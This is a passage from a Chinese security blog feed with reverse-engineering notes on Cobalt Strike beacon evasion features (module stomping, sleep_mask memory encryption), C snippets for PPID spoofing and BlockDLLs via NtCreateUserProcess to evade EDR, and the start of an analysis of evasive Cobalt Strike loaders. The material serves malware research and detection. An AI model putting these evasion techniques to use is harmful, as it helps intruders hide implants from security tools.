id="0x03-beacon差异性分析"><a href="#0x03-beacon差异性分析" class="headerlink" title="0x03 beacon差异性分析"></a>0x03 beacon差异性分析</h2><h3 id="0x3-1-module-x86"><a href="#0x3-1-module-x86" class="headerlink" title="0x3.1 module_x86"></a>0x3.1 module_x86</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，采用默认的C2Profile生成beacon文件，至于生成beacon的流程可以参考<a href="https://tttang.com/archive/1631/" target="_blank" rel="external">这篇文章</a>。然后测试一下<code>module_x86</code>属性。修改C2Profile文件的stage块。添加<code>set module_x86 &quot;xpsservices.dll&quot;;</code>这个语句。module_x86这个语句的作用是加载module_x86指定的模块，然后将beacon复写到该模块的内存区域。<br>    <img src="http://hacky.wang/blog/20220630/JXDvesPjVp5c.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在MalleablePE.java的<code>pre_process</code>会根据c2profile的set命令获取相对于的值，然后根据值对PE进行对于的操作。<br>    <img src="http://hacky.wang/blog/20220630/ocvcbKABCAcb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/OfmgiTaClxeI.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>setModuleStomp</code>这个方法中，首先将设置Characteristic为0x4000。然后在PE偏移为0x40的地方，添加大小为0x40的随机数据，接着在将C2Profile解析到的模块名(xpsservices.dll)写入PE偏移为0x40的地方，相当于重新覆盖直接写的随机数据的一部分。由此完成操作。<br>    <img src="http://hacky.wang/blog/20220630/9u2wKr0Hdsvm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对比一下生成的修改过module_x86属性的beacon.bin,和默认C2Profile生成的beacon.bin数据。有效的差异就是在PE+0x40出存在一个模块名。<br>    <img src="http://hacky.wang/blog/20220630/GIC0dckNuHuI.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了方便调试，生成一个beacon.exe程序，执行到beacon的时候，在PE偏移+0x40处下访问断点，以及针对LoadLibrary(Ex)W(A)下断点，程序中断在<code>003A82DF</code>处，每个断点都不一样。<br>    <img src="http://hacky.wang/blog/20220630/wNqDJ4QTvgaf.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/sbrwvssKe89k.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之后逻辑就很清楚了，首先加载指定的Module，然后通过函数需要，获取导出函数地址，分别将PE头和节区数据复制到目的地址。<br>    <img src="http://hacky.wang/blog/20220630/gQJXvIp85hvQ.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后解析入口点，进行跳转即可<br>    <img src="http://hacky.wang/blog/20220630/DIa1o2psyVts.png?imageslim" alt="mark"></p><h3 id="0x3-2-stomppe"><a href="#0x3-2-stomppe" class="headerlink" title="0x3.2 stomppe"></a>0x3.2 stomppe</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过<code>set stomppe &quot;true&quot;</code>启用stomppe，看官方文档的介绍，stomppe的目的是轻微混淆内存中的Dll beacon，通过查看源码，通过了解<code>PEEditor.setCharacteristic</code>函数发现，该函数目的就是修改PE文件头中的Characteristic属性，这个属性和该文件的类型有关。用PEview查看默认生成的beacon文件，通过该属性值很显然的发现，这是一个32bit的dll可执行文件。感觉这个功能挺鸡肋的。<br>    <img src="http://hacky.wang/blog/20220630/XYVCRl6MJ305.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/SpIMi09Hwrg0.png?imageslim" alt="mark"></p><h3 id="0x3-3-sleep-mask"><a href="#0x3-3-sleep-mask" class="headerlink" title="0x3.3 sleep_mask"></a>0x3.3 sleep_mask</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep_mask的作用是在sleep之前加密beacon以规避基于内存特征的查杀。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中断在<code>BeaconPayload.setupGargle</code>方法处，首先，在setupGargle函数中，重新读取了resources/beacon.dll数据，然后将.text段的EndAddr保存在Settings的序号为41的地址处。<br>    <img src="http://hacky.wang/blog/20220701/PQuinvVyJTmh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后计算rdata段和.text段之间的间距，如果间距小于256则不行。开始我很迷惑这步的操作，在后面的分析调试过程中，才发现，这个区域存储的是加密函数，而且当时我也好奇，如果要加密几个节区的话，代码段一旦被加密，事后怎么解密呢?其实CobaltStrike的设计者非常巧妙。<br>    <img src="http://hacky.wang/blog/20220701/xeG8iUSW0F52.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后获取了所有的Sections的起始地址和结束地址，并将其保存在序号为42的Settings处。<br>    <img src="http://hacky.wang/blog/20220701/9axT1NYmtHAf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;生成并调试beacon.exe，通过之前的分析，sleep_mask作用就是在beacon 休眠之前加密beacon，所以只需要在beacon所存放的内存区域设置访问断点即可。具体可以这样操作，假设beacon分配在0x00300000处，首先，针对使程序运行到337D06处，这是程序暴力枚举到beacon区域起始地址，也就是0x00300000处。我们首先需要跳过这部分。然后在0x00300000处下访问断点，运行后断在0x003383D8处，<br>    <img src="http://hacky.wang/blog/20220701/yLA72TN3SkNa.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们首先需要跳过这部分。然后在0x00300000处下访问断点，运行后断在0x003383D8处，显然可以看到依次将抹去了MZ的PE头和节区数据复制到新的区域。<br>    <img src="http://hacky.wang/blog/20220701/FVYcv0WI8gWY.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/zHwSy8zPAEO8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在新的beacon的地址，也就是0x00550000处下访问断点。然后运行，此时中断在0x00575533。因为经过多次调试，图片的断点已经不相符了。显然，beacon被加密之后，进行休眠。<br>    <img src="http://hacky.wang/blog/20220701/lczxvdQ8Hgop.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/20nPQGS63FvV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当休眠结束之后，将加密的beacon还原。然后通过交叉引用，将主要执行这一操作的函数定位到DllMain函数的Sub_591391_OptionalFunc的Sub_594267_SleepMask函数。<br>    <img src="http://hacky.wang/blog/20220701/zKzpOaWPRmpu.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/eopl9f75azjc.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/M9Tdct8e00WF.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/L2GNxc5i7K40.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Sub_8C9728_GetValueInC2Profile函数中，首先根据C2Profile的配置信息在偏移为0x29个元素的地方，取的值，如果取到的值为空的话，说明不需要加密，则直接Sleep，否则的话，进入Sub_8C4262_EncodeBeacon。<br>    <img src="http://hacky.wang/blog/20220701/qxd5A3PEzrRT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/I82xKiEDi8oL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sub_8C4262_EncodeBeacon在经过jmp后，首先，获取10004262h和10004262h的差值，因为从进程中dump出来的beacon的符号信息不完整，我们重新生成beacon.bin文件，查看这部分信息。很显然，sub_10004262和sub_100041D5函数是连续的，其本质就是为了获取sub_100041D5函数地址。<br>    <img src="http://hacky.wang/blog/20220701/m4U7kD1b6abT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/GxmbUhcc6qh6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后通过C2Profile获取.text段末尾的偏移地址，并将100041D5h的数据复制到.text段段尾。在重新生成的beacon.bin中查看100041D5h的内容。很显然其实就是一个加密函数。整个加密逻辑和上面其实是能对应上的。<br>    <img src="http://hacky.wang/blog/20220701/4H56nqEEFBXG.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/D3Lhw45jbKFh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/TGUkB1VIbkWJ.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着逻辑就很简单了，申请一个长度为0x10的Buffer，然后偏移为0x00的地方存储BaseAddress，在+0x04的地方存储获取的那些节区的地址，最后在偏移为0x08的地方保存生成的Key。将加密函数EncodeFunc和保存上述信息的结构体放到两个全局变量中，就可以在函数外面使用了。<br>    <img src="http://hacky.wang/blog/20220701/1Reaf5xVRncS.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/W4JnHbI5uqtj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将EncodeFunc下硬件执行断点，断下。整体逻辑大概就是这样的，首先去DataStruct的地址，这是一对地址(起始地址和结束地址)，分别取了地址之后，进行判空，以及起始地址要小于结束地址，然后去BaseAddress，因为DataStruct存储的是偏移地址，加上基地址才是各个区段的绝对地址。然后进行加密运算。当加密完成之后，执行Sleep操作，休眠完，在解密相关数据段即可。<br>    <img src="http://hacky.wang/blog/20220701/MmfhGPJg9vCN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，CobaltStrike通过获取Section的起始地址和结束地址，并获取.text的结束地址，并将加密函数复制到.text的结束地址到rdata段之间空的地方，因为这个地方不会被加密。该加密函数内部会调用Sleep进行休眠，在休眠之前，加密数据，在休眠之后解密数据，以此往复，实现Sleep_Mask的功能。不得不说，设计的非常巧妙。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://xz.aliyun.com/t/9224?page=1" target="_blank" rel="external">记一次cs bypass卡巴斯基内存查杀</a></li><li><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2#malleable-pe-process-injection-and-post-exploitationbeacon-hang-wei" target="_blank" rel="external">https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2#malleable-pe-process-injection-and-post-exploitationbeacon-hang-wei</a></li><li><a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/reference.profile#L254-L255" target="_blank" rel="external">https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/reference.profile#L254-L255</a></li><li>CobaltStrike4.0用户手册_中文翻译</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文转载于跳跳糖安全社区，原文链接为&lt;a href=&quot;https://tttang.com/archive/1662/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1662/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防对抗" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.14-5.20）学习</title>
    <link href="https://findream.github.io/2022/05/29/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81(2022.5.14-5.20)/"/>
    <id>https://findream.github.io/2022/05/29/绿盟科技-每周蓝军技术推送(2022.5.14-5.20)/</id>
    <published>2022-05-29T06:02:11.000Z</published>
    <updated>2022-06-14T13:10:09.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-每周蓝军技术推送（2022-5-14-5-20）"><a href="#0x00-每周蓝军技术推送（2022-5-14-5-20）" class="headerlink" title="0x00 每周蓝军技术推送（2022.5.14-5.20）"></a>0x00 每周蓝军技术推送（2022.5.14-5.20）</h2><ul><li>这一周的推送，主要学习了三部分内容：</li><li>篡改注册表与ETW，隐匿执行计划任务</li><li>使用NtCreateUserProcess进行PPID欺骗 和BlockDLL</li><li>Windows环境下的自保护探究<a id="more"></a></li></ul><h2 id="0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess"><a href="#0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess" class="headerlink" title="0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess"></a>0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</h2><ul><li><p>在<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">这篇文章中</a>，作者介绍了如何使用<code>NtCreateUserProcess</code>这一个未被官方文档化的API函数，NtCreateUserProcess函数是CreateProcessA(W)的底层实现。可以规避部分EDR的检测。</p></li><li><p>作者的灵感来源是来自Capt. Meelo的<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a>一文，NtCreateUserProcess的函数原型如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">NTSTATUS</div><div class="line">NTAPI</div><div class="line">NtCreateUserProcess(</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ProcessHandle,</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ThreadHandle,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ProcessDesiredAccess,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ThreadDesiredAccess,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ProcessObjectAttributes,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ThreadObjectAttributes,</div><div class="line">    <span class="variable">_In_</span> ULONG ProcessFlags,</div><div class="line">    <span class="variable">_In_</span> ULONG ThreadFlags,</div><div class="line">    <span class="variable">_In_</span> PRTL_USER_PROCESS_PARAMETERS ProcessParameters,</div><div class="line">    <span class="variable">_Inout_</span> PPS_CREATE_INFO CreateInfo,</div><div class="line">    <span class="variable">_In_</span> PPS_ATTRIBUTE_LIST AttributeList</div><div class="line">);</div></pre></td></tr></table></figure></li><li><p><code>ProcessHandle</code>和<code>ThreadHandle</code>分别是需要传出的进程和线程句柄，可以为NULL。</p></li></ul><ul><li><p><code>ProcessDesiredAccess</code>和<code>ThreadDesiredAccess</code>是进程和线程访问权限掩码。可以直接为PROCESS_ALL_ACCESS和THREAD_ALL_ACCESS，具体可以参见以下文档,</p><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" target="_blank" rel="external">进程安全和访问权限</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights" target="_blank" rel="external">线程安全和访问权限</a></li></ul></li><li><p><code>ProcessObjectAttributes</code>和<code>ThreadObjectAttributes</code>是进程和线程对象属性，指向OBJECT_ATTRIBUTES结构，此处可以为<code>NULL</code></p></li><li><p><code>ProcessFlags</code>和<code>ThreadFlags</code>是进程线程标志，Meelo是查看ProcessHack源码获得的，此处可以为NULL</p></li><li><p><code>ProcessParameters</code>是进程参数信息，指向的是<code>RTL_USER_PROCESS_PARAMETERS</code>结构，通过逆向CreateProcessA函数，可以发现使用<code>RtlCreateProcessParametersEx</code>进行初始化</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">UNICODE_STRING</span> <span class="string">NtImagePath;</span></div><div class="line"><span class="string">RtlInitUnicodeString(&amp;NtImagePath,</span> <span class="string">(PWSTR)L"\\??\\C:\\Windows\\System32\\mmc.exe");</span></div><div class="line"><span class="string">PRTL_USER_PROCESS_PARAMETERS</span> <span class="string">ProcessParameters</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></div><div class="line"><span class="string">RtlCreateProcessParametersEx(&amp;ProcessParameters,</span> <span class="string">&amp;NtImagePath,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">RTL_USER_PROCESS_PARAMETERS_NORMALIZED);</span></div></pre></td></tr></table></figure></li><li><p>CreateInfo是一个指向<code>PS_CREATE_INFO</code>结构的指针，对于PS_CREATE_INFO结构的初始化也很简单。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// process create info</span></div><div class="line">PS_CREATE_INFO CreateInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">CreateInfo.Size = sizeof(CreateInfo);</div><div class="line">CreateInfo.State = PsCreateInitialState;</div></pre></td></tr></table></figure></li><li><p>最后一个参数是<code>AttributeList</code>，AttributeList指向的是PPS_ATTRIBUTE_LIST结构体，这是一个链表结构，可以通过RtlAllocateHeap函数自主申请链表的大小。在第一个节点中,必须要添加PS_ATTRIBUTE_IMAGE_NAME（进程映像名）这个属性。</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_ATTRIBUTE_LIST</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">SIZE_T TotalLength;                 <span class="comment">// sizeof(PS_ATTRIBUTE_LIST)</span></div><div class="line">PS_ATTRIBUTE Attributes[<span class="number">2</span>];         <span class="comment">// Depends on how many attribute entries should be supplied to NtCreateUserProcess</span></div><div class="line">&#125; PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</div></pre></td></tr></table></figure></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// initialise attribute list</span></div><div class="line">PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * <span class="number">3</span>);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>TotalLength = sizeof(PS_ATTRIBUTE_LIST);</div><div class="line"><span class="comment">// set image name</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Attribute = PS_ATTRIBUTE_IMAGE_NAME;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Size = NtImagePath.Length;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Value = (ULONG_PTR)NtImagePath.Buffer;</div></pre></td></tr></table></figure><ul><li><p>作者在这篇文章中主要实现了两个功能，一个是PPID Spoofing，也就是父进程欺骗，另外一个是BlockDLLs，BlockDLLs简单的来说就是阻止一些非可信的DLL模块加载到进程中。</p></li><li><p>进程隐藏可以通过设置进程的Attribute即可，具体操作如下,将进程的PS_ATTRIBUTE_PARENT_PROCESS(父进程)属性设置为指定的父进程的Handle即可。：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// add parent process attribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Size = sizeof(HANDLE);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].ValuePtr = hParent;</div></pre></td></tr></table></figure></li><li><p>BlockDLLs允许系统根据不同的策略加载不同安全等级的Dll文件，因为一些安全软件会通过往进程中加载dll来进行行为监控，利用这个特性就可以阻止非windows的dll加载，包括安全软件的dll。<a href="https://paper.seebug.org/929/" target="_blank" rel="external">这里</a>可以看到完整的BlockDlls的介绍,主要有两种方法。</p><ul><li><p>通过<code>SetProcessMitigationPolicy</code>函数设置阻止策略。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy;</div><div class="line">policy.MitigationOptIn = 1;</div><div class="line">SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;policy, sizeof(policy))</div></pre></td></tr></table></figure></li><li><p>通过UpdateProcThreadAttribute修改线程属性。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DWORD64 ProtectionLevel = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON<span class="comment">; //policy.MitigationOptIn</span></div><div class="line">UpdateProcThreadAttribute(<span class="name">si</span>.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, <span class="symbol">&amp;ProtectionLevel</span>, sizeof(<span class="name">ProtectionLevel</span>), NULL, NULL)</div></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// blockdlls policy</span></div><div class="line">DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;</div><div class="line"><span class="comment">// add process mitigation atribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Size = sizeof(DWORD64);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].ValuePtr = &amp;policy;</div></pre></td></tr></table></figure><ul><li><p>Ref:<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</a></p></li><li><p>Ref:<a href="[https://paper.seebug.org/929/](https://paper.seebug.org/929/">关于 CS 的 Blockdll 实现的个人 POC</a>)</p></li><li><p>Ref:<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a></p></li><li><p>Ref:<a href="https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp" target="_blank" rel="external">https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp</a></p></li></ul><h2 id="0x02-Windows环境下的自保护探究"><a href="#0x02-Windows环境下的自保护探究" class="headerlink" title="0x02 Windows环境下的自保护探究"></a>0x02 Windows环境下的自保护探究</h2><ul><li>这篇文章作者的思路是这样的，在kill 杀软进程的时候，会使用OpenProcess打开杀软进程，在OPenProcessAPI函数底层呢，会调用ObRegisterCallbacks注册回调函数，所以作者的目的就是通过注册回调函数，首先判断当前进程ID是否是杀软自身的PID，如果是的话，则去除Kill进程的权限。<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O<span class="function"><span class="title">perationInformation</span>-&gt;</span>P<span class="function"><span class="title">arameters</span>-&gt;</span>CreateHandleInformation.DesiredAccess &amp;= ~PROCESS_TERMINATE;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-每周蓝军技术推送（2022-5-14-5-20）&quot;&gt;&lt;a href=&quot;#0x00-每周蓝军技术推送（2022-5-14-5-20）&quot; class=&quot;headerlink&quot; title=&quot;0x00 每周蓝军技术推送（2022.5.14-5.20）&quot;&gt;&lt;/a&gt;0x00 每周蓝军技术推送（2022.5.14-5.20）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这一周的推送，主要学习了三部分内容：&lt;/li&gt;
&lt;li&gt;篡改注册表与ETW，隐匿执行计划任务&lt;/li&gt;
&lt;li&gt;使用NtCreateUserProcess进行PPID欺骗 和BlockDLL&lt;/li&gt;
&lt;li&gt;Windows环境下的自保护探究
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike高免杀样本分析</title>
    <link href="https://findream.github.io/2022/05/25/CobaltStrike%E9%AB%98%E5%85%8D%E6%9D%80%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/05/25/CobaltStrike高免杀样本分析/</id>
    <published>2022-05-25T06:02:11.000Z</published>
    <updated>2022-06-14T13:11:35.494Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。<br><a id="more"></a></p><h2 id="0x01-Example1"><a href="#0x01-Example1" class="headerlink" title="0x01 Example1"></a>0x01 Example1</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个loader由C#编写，通过<code>powerShell.AddScript(@string);</code>加载加密过的Powershell脚本，然后通过<code>powerShell.BeginInvoke</code>执行。<br>   <img src="http://hacky.wang/blog/20220525/qaXTWKJGj3oG.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/igppaXzAbCFp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第2层powershell脚本中，依旧是执行Base64加密/编码过的Powershell语句<br>   <img src="http://hacky.wang/blog/20220525/D2dzLkeJRY7N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过解码得到解码之后的Powershell脚本。第三层Powershell脚本逻辑也很清楚，首先解码一段base64，然后进行xor解密，获得一段shellcode，然后将解密获得的shellcode复制到内存中并执行。<br>   <img src="http://hacky.wang/blog/20220525/M1sraJ1PX2zv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过分析，转储而来的shellcode是典型的cobaltstrike生成stageless类型的shellcode。也就是所谓的分离式免杀的操作。<br>   <img src="http://hacky.wang/blog/20220525/HlfthlTWfRdY.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/d87EH0lvK6Ee.png?imageslim" 